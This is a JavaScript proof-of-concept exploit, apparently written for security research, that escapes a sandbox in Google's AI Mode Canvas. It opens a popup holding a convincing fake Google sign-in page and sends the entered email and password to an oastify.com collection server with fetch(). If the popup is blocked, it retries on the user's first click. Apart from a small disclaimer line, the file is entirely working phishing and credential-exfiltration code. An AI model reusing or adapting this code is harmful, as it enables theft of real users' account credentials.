/**
 * Google AI Mode Canvas — Sandbox Escape PoC
 * 
 * Loads inside canvas SCF sandbox via:
 *   <script src="https://cdn.jsdelivr.net/gh/OWNER/REPO@main/poc.js"></script>
 *
 * Demonstrates:
 *   1. Popup escapes sandbox (allow-popups-to-escape-sandbox)
 *   2. Popup has NO CSP — full network access to attacker server
 *   3. Credential phishing under google.com URL bar context
 */

(function () {
  var ATTACKER = "https://6w3fcd90nt9ne833v8gij2k3dujl7cv1.oastify.com";

  function openPhish() {
    var w = window.open("", "_blank", "width=450,height=580,left=200,top=80");
    if (!w) return false;

    w.document.write('<!DOCTYPE html>\
<html><head>\
<meta charset="utf-8">\
<title>Sign in \u2013 Google Accounts</title>\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#f8f9fa;display:flex;justify-content:center;padding-top:48px}\
.c{background:#fff;border-radius:8px;padding:48px 40px 36px;width:400px;box-shadow:0 1px 3px rgba(0,0,0,.12)}\
.g{text-align:center;margin-bottom:16px;font-size:24px}\
.g span:nth-child(1){color:#4285F4}.g span:nth-child(2){color:#EA4335}\
.g span:nth-child(3){color:#FBBC05}.g span:nth-child(4){color:#4285F4}\
.g span:nth-child(5){color:#34A853}.g span:nth-child(6){color:#EA4335}\
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin:4px 0}\
.s{text-align:center;color:#5f6368;font-size:16px;margin-bottom:32px}\
.f{margin-bottom:24px;position:relative}\
.f input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;color:#202124;background:#fff}\
.f input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}\
.f .l{position:absolute;top:-8px;left:12px;background:#fff;padding:0 4px;font-size:12px;color:#5f6368}\
.a{display:flex;justify-content:space-between;align-items:center;margin-top:36px}\
.a a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}\
.a button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}\
.a button:hover{background:#1669c1;box-shadow:0 1px 2px rgba(0,0,0,.3)}\
.note{text-align:center;margin-top:28px;font-size:11px;color:#9aa0a6}\
</style>\
</head><body>\
<div class="c">\
<div class="g"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>\
<h1>Sign in</h1>\
<p class="s">Your session expired. Sign in to continue.</p>\
<form id="f">\
<div class="f"><span class="l">Email</span><input type="email" name="email" id="e" autofocus required></div>\
<div class="f"><span class="l">Password</span><input type="password" name="pass" id="p" required></div>\
<div class="a"><a href="#">Forgot password?</a><button type="submit">Next</button></div>\
</form>\
<p class="note">Security research PoC \u2014 not a real sign-in page</p>\
</div>\
<script>\
document.getElementById("f").addEventListener("submit", function(ev) {\
  ev.preventDefault();\
  var email = document.getElementById("e").value;\
  var pass = document.getElementById("p").value;\
  document.querySelector("h1").textContent = "Verifying\u2026";\
  document.querySelector(".s").textContent = "Please wait";\
  fetch("' + ATTACKER + '/collect", {\
    method: "POST",\
    headers: {"Content-Type": "application/json"},\
    body: JSON.stringify({email: email, pass: pass, origin: "canvas-poc"}),\
    mode: "no-cors"\
  }).finally(function() {\
    setTimeout(function() { window.close(); }, 1500);\
  });\
});\
</script>\
</body></html>');
    w.document.close();
    return true;
  }

  // Try immediately, retry on first user interaction if popup was blocked
  if (!openPhish()) {
    document.addEventListener("click", function h() {
      openPhish();
      document.removeEventListener("click", h);
    }, { once: true });
  }
})();
